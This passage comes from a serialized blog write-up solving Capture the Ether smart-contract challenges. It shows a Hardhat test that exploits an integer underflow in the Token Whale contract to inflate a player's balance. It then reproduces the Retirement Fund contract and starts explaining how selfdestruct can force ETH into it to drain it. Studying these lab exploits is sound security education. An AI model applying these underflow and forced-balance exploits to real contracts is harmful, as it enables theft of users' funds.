this, we need to approve another wallet which has a token balance of 0, to transfer tokens from our account. Then this other account can call "},{type:b,tag:o,props:{},children:[{type:a,value:bG}]},{type:a,value:" on the "},{type:b,tag:o,props:{},children:[{type:a,value:Y}]},{type:a,value:" account, and we'll see that the second account's balance has wrapped back round to 2"},{type:b,tag:ao,props:{},children:[{type:a,value:bC}]},{type:a,value:"-1. Then the second account can just transfer as many tokens as we want to the player account to let us complete the challenge. Let's check that our logic for the first part is right:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"test\u002Fmath\u002Ftoken-whale-challenge.ts"}]},{type:b,tag:O,props:{className:[P,aT]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ap},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:aq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ar},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:as}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aU}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:cU}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aV}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"should return true if we increase the player's token balance to over 1 million tokens\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aW}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:" helper"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bp}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aX},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:at}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:cU}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aY},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:aZ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:au}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ax}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" approvalTx "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:bV},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:a$}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cS}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:ca},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bc}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bn}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bc}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:cV}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:"8"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:" approvalTx"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ba}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F It doesn't matter who we transfer tokens to, because the contract has no"}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F restrictions on this, and it doesn't affect the test to do it this way."}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" transferTx1 "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:bV},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:a$}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:ca},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bG}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:" transferTx1"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ba}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:"console"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:"log"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aQ}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:ca},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Now if we run this test with "},{type:b,tag:o,props:{},children:[{type:a,value:"npx hardhat test test\u002Fmath\u002Ftoken-whale-challenge.ts"}]},{type:a,value:", we get the following output:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,bD]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"  TokenWhaleChallenge\nBigNumber { value: \"115792089237316195423570985008687907853269984665640564039457584007913129639935\" }\n    âœ“ should return true if we increase the player's token balance to over 1 million tokens (717ms)\n\n\n  1 passing (719ms)\n"}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"That is definitely more than 1 million tokens! Exactly as expected, it is equal to "},{type:b,tag:o,props:{},children:[{type:a,value:"ethers.constants.MaxUint256"}]},{type:a,value:". Now we just need to transfer some of these tokens to the player's account:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,aS]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"diff --git a\u002Ftest\u002Fmath\u002Ftoken-whale-challenge.ts b\u002Ftest\u002Fmath\u002Ftoken-whale-challenge.ts\nindex 9c7c877..7655280 100644\n"},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:"--- a\u002Ftest\u002Fmath\u002Ftoken-whale-challenge.ts"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,$]},children:[{type:a,value:"+++ b\u002Ftest\u002Fmath\u002Ftoken-whale-challenge.ts"}]},{type:a,value:"\n@@ -22,6 +22,13 @@ describe(\"TokenWhaleChallenge\", function () {\n"},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"      .transferFrom(player.address, player.address, 1);\n"},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:"    await transferTx1.wait();\n"}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,bs,af]},children:[{type:b,tag:c,props:{className:[d,p,af]},children:[{type:a,value:ay}]},{type:a,value:"    console.log(await challenge.balanceOf(helper.address));\n"}]},{type:b,tag:c,props:{className:[d,ai,A]},children:[{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    \u002F\u002F It doesn't matter who we transfer tokens to, because the contract has no\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    \u002F\u002F restrictions on this, and it doesn't affect the test to do it this way.\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    const transferTx2 = await challenge\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"      .connect(helper)\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"      .transfer(player.address, 10 ** 6);\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:"    await transferTx2.wait();\n"},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,p,A]},children:[{type:a,value:D}]},{type:a,value:cL}]},{type:b,tag:c,props:{className:[d,u]},children:[{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:bY},{type:b,tag:c,props:{className:[d,p,u]},children:[{type:a,value:f}]},{type:a,value:bZ}]}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Tada! Our player account now has 1,001,001 tokens!"}]},{type:a,value:m},{type:b,tag:aC,props:{id:co},children:[{type:b,tag:T,props:{href:cv,ariaHidden:ae,tabIndex:aD},children:[{type:b,tag:c,props:{className:[aE,aF]},children:[]}]},{type:a,value:bx}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"The Retirement Fund challenge is another underflow-based challenge. Looking at the code, you can see that "},{type:b,tag:o,props:{},children:[{type:a,value:"uint256 withdrawn"}]},{type:a,value:" in the "},{type:b,tag:o,props:{},children:[{type:a,value:cb}]},{type:a,value:" method has no bounds checking. So if we can force "},{type:b,tag:o,props:{},children:[{type:a,value:"address(this).balance"}]},{type:a,value:" to be greater than "},{type:b,tag:o,props:{},children:[{type:a,value:"startBalance"}]},{type:a,value:", we should be able to drain the contract."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"contracts\u002Fmath\u002FRetirementFundChallenge.sol"}]},{type:b,tag:O,props:{className:[P,aG]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aH}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aI}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:aJ}]},{type:b,tag:c,props:{className:[d,aK,B]},children:[{type:a,value:aL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aM}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,am]},children:[{type:a,value:bx}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:" startBalance"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:" owner "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:bH},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:cW},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:" expiration "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:" now "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:D}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bc}]},{type:a,value:" years"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bx}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aO}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aP},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:a,value:aN},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:"\n\n        beneficiary "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:"\n        startBalance "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:bH},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:"value"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ah}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bi}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bj}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:bk}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bl}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:al}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bB},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bI}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bu}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bJ},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:bb},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:az},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:cX}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"now "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:cz}]},{type:a,value:" expiration"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:"\n            "},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F early withdrawal incurs a 10% penalty"}]},{type:a,value:cY},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aR}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:al}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bB},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bn}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:"9"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:cZ}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bc}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:c_}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:cY},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aR}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:al}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bK},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cb}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bJ},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:cW},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:az},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:" withdrawn "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:" startBalance "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ay}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:al}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bK},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:az},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F an early withdrawal occurred"}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"withdrawn "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:c$}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bI}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:az},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F penalty is what's left"}]},{type:a,value:cD},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aR}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:al}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bK},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"We can trigger this by using the EVM opcode "},{type:b,tag:o,props:{},children:[{type:a,value:cc}]},{type:a,value:", which removes all of a contract's data from the blockchain, and sends any ETH in the contract to an address of the contract's choosing. This can be (ab)used to force ETH into any account or smart contract. This forced sending of ETH cannot be prevented - meaning we should never rely on the balance of a contract being any specific value. To implement this, we write a contract that does nothing but allow us to blow it up and send an amount of ETH in the 